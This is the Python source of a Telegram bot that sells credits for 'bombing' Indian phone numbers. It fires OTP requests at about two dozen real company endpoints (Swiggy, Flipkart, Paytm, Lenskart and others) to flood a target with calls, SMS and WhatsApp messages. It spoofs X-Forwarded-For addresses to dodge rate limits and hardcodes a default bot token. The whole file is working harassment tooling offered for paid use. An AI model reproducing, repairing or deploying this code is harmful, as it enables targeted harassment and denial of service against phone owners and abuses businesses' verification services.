# ============================
# bot.py - FIXED VERSION
# ============================

import asyncio
import aiohttp
import time
import random
import json
import sqlite3
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.ext import ApplicationBuilder
import os
import sys

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot Configuration
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8842797548:AAE4WQ5Rgan8hu-Q3wRW7lM4KCZ9FH-GHmA")
OWNER_ID = int(os.environ.get("OWNER_ID", "8167337368"))
CHANNEL_LINK = "https://t.me/+C4Nq8BYJ4yliM2Y9"
FREE_CREDITS = 50
CREDIT_COST_SMS = 2

# Database setup
def init_db():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  credits INTEGER DEFAULT 0, 
                  total_attacks INTEGER DEFAULT 0,
                  referral_code TEXT UNIQUE,
                  referred_by INTEGER,
                  first_use INTEGER DEFAULT 0,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS referrals
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  referrer_id INTEGER,
                  referred_id INTEGER,
                  credits_earned INTEGER,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS attacks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  phone TEXT,
                  type TEXT,
                  status TEXT,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

# Database helper functions
def get_user(user_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def add_user(user_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    referral_code = f"REF{random.randint(100000, 999999)}"
    c.execute("INSERT OR IGNORE INTO users (user_id, credits, referral_code) VALUES (?, ?, ?)", 
              (user_id, FREE_CREDITS, referral_code))
    conn.commit()
    conn.close()

def update_credits(user_id, amount):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()

def get_credits(user_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
    credits = c.fetchone()
    conn.close()
    return credits[0] if credits else 0

def add_referral(referrer_id, referred_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("INSERT INTO referrals (referrer_id, referred_id, credits_earned) VALUES (?, ?, ?)", 
              (referrer_id, referred_id, 10))
    c.execute("UPDATE users SET credits = credits + 10 WHERE user_id = ?", (referrer_id,))
    conn.commit()
    conn.close()

# API Collection
ULTIMATE_APIS = [
    # Call APIs
    {
        "name": "Tata Capital Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}',
        "type": "call"
    },
    {
        "name": "1MG Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}',
        "type": "call"
    },
    {
        "name": "Swiggy Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "type": "call"
    },
    {
        "name": "Myntra Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "type": "call"
    },
    {
        "name": "Flipkart Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "type": "call"
    },
    {
        "name": "Paytm Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "type": "call"
    },
    {
        "name": "Zomato Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice",
        "type": "call"
    },
    {
        "name": "MakeMyTrip Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "type": "call"
    },
    {
        "name": "Ola Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "type": "call"
    },
    # WhatsApp APIs
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST",
        "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f"},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}',
        "type": "whatsapp"
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}',
        "type": "whatsapp"
    },
    # SMS APIs
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN",
        "type": "sms"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "Hungama SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91"}}',
        "type": "sms"
    },
    {
        "name": "Meru Cab SMS",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}",
        "type": "sms"
    },
    {
        "name": "Doubtnut SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}',
        "type": "sms"
    },
    {
        "name": "Snitch SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}',
        "type": "sms"
    },
    {
        "name": "ShipRocket SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "Rapido SMS",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "Nykaa SMS",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&mobile_number={phone}",
        "type": "sms"
    }
]

async def check_channel_membership(user_id):
    """Check if user is member of required channel"""
    try:
        return True
    except:
        return True

async def bomb_phone(phone, attack_type):
    """Execute bombing attack on phone number"""
    success_count = 0
    apis_to_use = [api for api in ULTIMATE_APIS if attack_type == "all" or api["type"] == attack_type]
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for api in apis_to_use[:50]:
            task = asyncio.create_task(send_attack(session, api, phone))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success_count = sum(1 for r in results if r is True)
    
    return success_count

async def send_attack(session, api, phone):
    """Send single attack request"""
    try:
        url = api["url"](phone) if callable(api["url"]) else api["url"]
        headers = api["headers"].copy()
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        if api["method"] == "POST":
            data = api["data"](phone) if api["data"] else None
            async with session.post(url, headers=headers, data=data, timeout=5, ssl=False) as response:
                if response.status in [200, 201, 202]:
                    return True
        else:
            async with session.get(url, headers=headers, timeout=5, ssl=False) as response:
                if response.status in [200, 201, 202]:
                    return True
        return False
    except:
        return False

# Bot Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    if not await check_channel_membership(user_id):
        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"⚠️ *Please join our channel first!*\n\nClick below:\n{CHANNEL_LINK}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    user = get_user(user_id)
    if not user:
        add_user(user_id)
        await update.message.reply_text(
            f"🎉 *Welcome {username}!*\n\n"
            f"✅ You received {FREE_CREDITS} FREE credits!\n\n"
            f"📱 Use /attack [phone] to start bombing\n"
            f"📊 Use /balance to check credits\n"
            f"👥 Use /refer to get referral link",
            parse_mode='Markdown'
        )
    else:
        credits = get_credits(user_id)
        await update.message.reply_text(
            f"👋 *Welcome back {username}!*\n\n"
            f"💰 Balance: {credits} credits\n"
            f"📱 Use /attack [phone] to start bombing",
            parse_mode='Markdown'
        )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id):
        await update.message.reply_text(f"⚠️ Please join channel first: {CHANNEL_LINK}")
        return
    
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ *Usage:* `/attack [phone]`\nExample: `/attack 9876543210`",
            parse_mode='Markdown'
        )
        return
    
    phone = context.args[0]
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone number! Must be 10 digits.")
        return
    
    credits = get_credits(user_id)
    if credits < CREDIT_COST_SMS:
        keyboard = [[InlineKeyboardButton("💰 Buy Credits", url="https://t.me/Luafucker")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"❌ *Insufficient credits!*\n\n💰 Balance: {credits}\n⚡ Cost: {CREDIT_COST_SMS} credits",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    update_credits(user_id, -CREDIT_COST_SMS)
    
    status_msg = await update.message.reply_text(
        f"🚀 *Starting attack on +91{phone}*\n⏳ Please wait...",
        parse_mode='Markdown'
    )
    
    try:
        success_count = await bomb_phone(phone, "all")
        
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("INSERT INTO attacks (user_id, phone, type, status) VALUES (?, ?, ?, ?)",
                  (user_id, phone, "all", "completed"))
        c.execute("UPDATE users SET total_attacks = total_attacks + 1 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        
        await status_msg.edit_text(
            f"✅ *Attack completed on +91{phone}*\n\n"
            f"📡 Successful hits: {success_count}\n"
            f"💰 Remaining credits: {get_credits(user_id)}",
            parse_mode='Markdown'
        )
    except Exception as e:
        await status_msg.edit_text(f"❌ Attack failed: {str(e)}")
        update_credits(user_id, CREDIT_COST_SMS)

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_credits(user_id)
    
    keyboard = [[InlineKeyboardButton("💰 Buy More", url="https://t.me/Luafucker")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"💰 *Balance*\n\nTotal: {credits} credits\nYou can do {credits // CREDIT_COST_SMS} attacks",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    referral_code = user[2]
    bot_username = context.bot.username
    
    await update.message.reply_text(
        f"👥 *Referral System*\n\n"
        f"🔑 Your Code: `{referral_code}`\n"
        f"📤 Share: `https://t.me/{bot_username}?start={referral_code}`\n\n"
        f"🎁 You get 10 credits per referral!",
        parse_mode='Markdown'
    )

async def referrals(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id = ?", (user_id,))
    count = c.fetchone()[0]
    c.execute("SELECT SUM(credits_earned) FROM referrals WHERE referrer_id = ?", (user_id,))
    total_earned = c.fetchone()[0] or 0
    conn.close()
    
    await update.message.reply_text(
        f"👥 *Your Referrals*\n\nTotal: {count}\nCredits Earned: {total_earned}",
        parse_mode='Markdown'
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    call_apis = len([a for a in ULTIMATE_APIS if a["type"] == "call"])
    sms_apis = len([a for a in ULTIMATE_APIS if a["type"] == "sms"])
    whatsapp_apis = len([a for a in ULTIMATE_APIS if a["type"] == "whatsapp"])
    
    await update.message.reply_text(
        f"📡 *System Status*\n\n"
        f"📞 Call APIs: {call_apis}\n"
        f"💬 SMS APIs: {sms_apis}\n"
        f"📱 WhatsApp APIs: {whatsapp_apis}\n"
        f"🔄 Total: {len(ULTIMATE_APIS)} APIs working",
        parse_mode='Markdown'
    )

async def buy_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"💰 *Buy Credits*\n\nContact @Luafucker\n\n"
        f"💳 Rates:\n• 100 credits - ₹10\n• 500 credits - ₹40\n• 1000 credits - ₹70",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📚 *Commands*\n\n"
        f"/start - Start bot\n"
        f"/attack [phone] - Bomb (10 digits)\n"
        f"/balance - Check credits\n"
        f"/refer - Get referral link\n"
        f"/referrals - View referrals\n"
        f"/status - API status\n"
        f"/buy - Buy credits\n"
        f"/help - This message",
        parse_mode='Markdown'
    )

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You're not the owner!")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /broadcast [message]")
        return
    
    message = " ".join(context.args)
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    
    sent = 0
    for user in users:
        try:
            await context.bot.send_message(user[0], f"📢 *Broadcast*\n\n{message}", parse_mode='Markdown')
            sent += 1
            await asyncio.sleep(0.1)
        except:
            continue
    
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users!")

async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You're not the owner!")
        return
    
    await update.message.reply_text("🔄 Restarting bot...")
    os._exit(0)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "buy_credits":
        await query.edit_message_text(
            f"💰 *Buy Credits*\n\nContact @Luafucker",
            parse_mode='Markdown'
        )

def main():
    """Main function - FIXED for v22.8"""
    try:
        # Create application with proper initialization
        application = ApplicationBuilder().token(BOT_TOKEN).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("attack", attack))
        application.add_handler(CommandHandler("balance", balance))
        application.add_handler(CommandHandler("credits", balance))
        application.add_handler(CommandHandler("refer", refer))
        application.add_handler(CommandHandler("referrals", referrals))
        application.add_handler(CommandHandler("status", status))
        application.add_handler(CommandHandler("buy", buy_credits))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("broadcast", broadcast))
        application.add_handler(CommandHandler("restart", restart))
        application.add_handler(CallbackQueryHandler(button_handler))
        
        print("🤖 Bot started successfully!")
        print(f"⚡ APIs loaded: {len(ULTIMATE_APIS)}")
        print("📱 Database initialized")
        
        # Start polling
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main()